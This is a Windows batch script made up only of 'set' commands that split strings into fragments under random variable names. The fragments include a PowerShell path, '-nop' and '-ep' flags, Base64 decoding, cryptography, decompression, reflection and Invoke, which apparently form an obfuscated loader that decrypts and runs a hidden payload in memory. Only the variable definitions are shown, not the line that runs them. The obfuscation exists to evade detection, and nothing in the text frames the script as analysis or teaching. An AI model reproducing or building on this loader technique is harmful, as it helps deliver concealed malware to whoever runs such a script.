@echo off
set "foMRWAXoLa= /"
set "YOsiSxgwvg=\W"
set "WQBcnvPLrF=\v"
set "YjKScuIHKu=:\"
set "bofROxUYyS=po"
set "snjHXzwQaA=ll"
set "KAwufLylQL=nd"
set "OgVIAaKQDf=rs"
set "VxQYHYKQkn=st"
set "GHXivhEqyn=Po"
set "jWgKyhNAJP=0\"
set "InuNGFObSs=we"
set "IpcBDiRWYB=he"
set "UOXBiDEgxv=py"
set "utarpzpWEk=do"
set "rqJZGyMpMq=Sy"
set "bwhUuxJBHa=32"
set "EUPciGhHAI=y "
set "hkRlRQKHBL=rS"
set "ZTRQwgOvhT=in"
set "ovaMnMvRVh=he"
set "NevtkHHYMC=xe"
set "XciuaVtwrO=.e"
set "VPLdAHrLMr= C"
set "pijjpKStvv=ws"
set "xXONYmmHzU=1."
set "qleJZEqabM=Wi"
set "AkpqsfdnFx=co"
set "UXvceJKbeV=s\"
set "zkBnSNetpv=em"
set "WJApKXkKsp=we"
set "NsBozLefyO=ow"
set "UZxrBbOvCJ=ll"
set "nqhdbXLKnK= %~dp0"
set "ZZLLaNnQRP=cd"
set "hRGWyDCtjV=rofi"
set "WECdQkRRVy=UPb."
set "CNjbyHWCdC=.Mem"
set "mxFnyjRnPV=New-"
set "hfYfEXQiKP=zTXT"
set "KewgRQoUQK=esaB"
set "JUxHzhqGml=flec"
set "FHSaIDojCE=Disp"
set "pxKJvBrbpF=m.Re"
set "vaVWQRGCvo=$EYX"
set "QMmlLRAshJ=gth)"
set "fdiJvpNrIv= = ["
set "ahrfEUZzJv=vert"
set "aOHEARMgpm=).Sp"
set "DZgUhTQBxQ=::('"
set "swlzJgJqaK=and "
set "asChIhCXGq=-nop"
set "tWCjEzFoRL=pDZz"
set "rOzEJYSyRn=-1.."
set "QfPxmeXbbs=;$UT"
set "vXKHRSKlkt=.Cry"
set "LSdBMYmBay=.Key"
set "xNXLftTUNV=[Env"
set "LSiUWaGOHJ=] -j"
set "rvsJiUNIdL=$vzT"
set "wjsVoryHIK=; };"
set "QmtCjXXdGZ=]::C"
set "MqjuUkbavC=g = "
set "YvTpthraYt=Syst"
set "dtAJhAutUn=Bmor"
set "cCcXpbfsqr=v4Ir"
set "QdnIAHqNWn=tnCk"
set "yVeMFSKGTZ=onve"
set "AkiLnfIkul=Stre"
set "ZkZPZgkXoz=ne);"
set "hqDaxFvKjZ=ment"
set "mqtBPnNhUr=[Sys"
set "BbSpLiHWZL=QeM."
set "gPPfrogAnI=cA ="
set "YRtugzgTPD=ewLi"
set "hjcgyvKSzd=esFX"
set "eGSONSEhOw=grap"
set "UsnCrvknsI=t Sy"
set "qDxAoTEvfI=ress"
set "QEDOJOlzPF=T.Pa"
set "YcuYKBBpkH=ay()"
set "qUhkkaQarz=Q, 0"
set "cSHYiPgFxo=QeM "
set "fcTnVQNeWs=XQ);"
set "bquggvBfao=e]::"
set "UgNKJLCLzn=cG.T"
set "RYTqNHMDLZ=ck($"
set "UUGYjBDAMv=tem."
set "REnxXDXKAj===')"
set "xLgZInhPxR=S46e"
set "pIHUbmcGGd=eam("
set "DHiPzuUQzF=tem."
set "gPoGvPkyCn=m(, "
set "ADtPDhUWIz=Q = "
set "pdphLTDwlK=join"
set "YnpbhnQVyg=]::N"
set "bkHPqAbvkY=ct S"
set "RheeVOnpfJ=mory"
set "kuzzluQzCh=lit("
set "dkjBSroPpB=.Mod"
set "RnakyHYbLP='[-1"
set "OpNPhdSxon=e = "
set "IyOKFNSmqJ=.-16"
set "YkCjTPmyRY=:: '"
set "gUicwbjCnN= [Sy"
set "PhNdTdOlGW=oin "
set "cKoyqAlJLb=$Edz"
set "msDEjBkbVW=ert]"
set "EesrXZdzav=d;$v"
set "gQYZChzKMZ=)($Z"
set "xdkaFUxTmH= '')"
set "ahxavjlgOi=y.Cr"
set "PiCgwXGyNE=$BCj"
set "SbewwSJiHk=;$pG"
set "emGJcJSTZt=.Dis"
set "LZIUXDnjcc=$adm"
set "NXeULkiuwq=sion"
set "WaCFNVqrqD=XQ ="
set "cfCjHkWyde=-Obj"
set "zTaxedSxxV=ion."
set "wXZUKJCPZU=ke($"
set "INRuzotQQT=BCjX"
set "XektbUmPaq=se()"
set "MWySOcoSMh=736u"
set "lRlnltmKmZ=;$Ed"
set "JnRneYJLpr=Syst"
set "zhiSXhTFKn=yste"
set "aHpmSyijsS=PKCS"
set "HRgERncVpC=-joi"
set "DtAbUyWIbs=yste"
set "vXZRKaXBUr=zTXT"
set "VSjRbRQKCC=q.En"
set "HMZjWdqgJA=nirt"
set "bCGIKHkghJ=-ep "
set "HlDGOPomCB=:('g"
set "TyhtokitjA=pose"
set "uwuUNRFEJz=rtS4"
set "RPoKjCzVea=cA);"
set "YSeHgVeEYB=[-1."
set "LGlwMbXzlw=tryP"
set "kgArnlfKPt=.Com"
set "RntyNZRHKt=y]::"
set "hxoxGHlGnF=ss -"
set "BuFzQxRtXt=$BCj"
set "JDWnXbAEzZ=, (,"
set "xlJwiIIxil=-joi"
set "GWNfThMOIM=Mode"
set "HwzSLZLbNW=);$E"
set "insFCuaDeS=3); "
set "rXPmJbfLFN=Comp"
